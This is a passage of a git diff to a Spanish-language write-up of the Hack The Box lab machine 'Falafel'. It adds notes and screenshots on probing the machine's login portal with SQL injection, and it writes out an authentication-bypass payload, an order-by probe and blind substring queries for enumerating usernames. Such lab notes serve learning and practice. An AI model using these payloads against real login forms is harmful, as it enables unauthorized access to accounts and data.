@@ -11,9 +11,24 @@ En el puerto 80 se encuentra un portal con un login si intentamos ingresar datos
 
 Tambien nos damos cuenta que el portal es vulnerable sql injection. Se puede usar este mensaje para una blind SQLI.
 
+![image](https://github.com/gecr07/Falafel-htb/assets/63270579/59e9e1b7-fadd-4ba3-9f74-8290b9203e93)
+
 
 ```
+admmin' or 1=1-- -
+admin' order by 100-- - # Manda error lo que seria un indicador claro que si es vulnerable.
+```
 
+Para aprovecharlo si esta bien nos va a mostrar el otro mensaje
+
+![image](https://github.com/gecr07/Falafel-htb/assets/63270579/03bb7c46-b5b9-44a1-9e79-644676ae6530)
+
+```
+admin' and substring(username,1,1)='a'-- -
+
+Saldra mensaje de que el usuario es correcto pero no el password si esta mal pone Try again.
+
+admin' and substring(username,1,1)='a'-- -
 ```
 
 ## PHP Juggling 
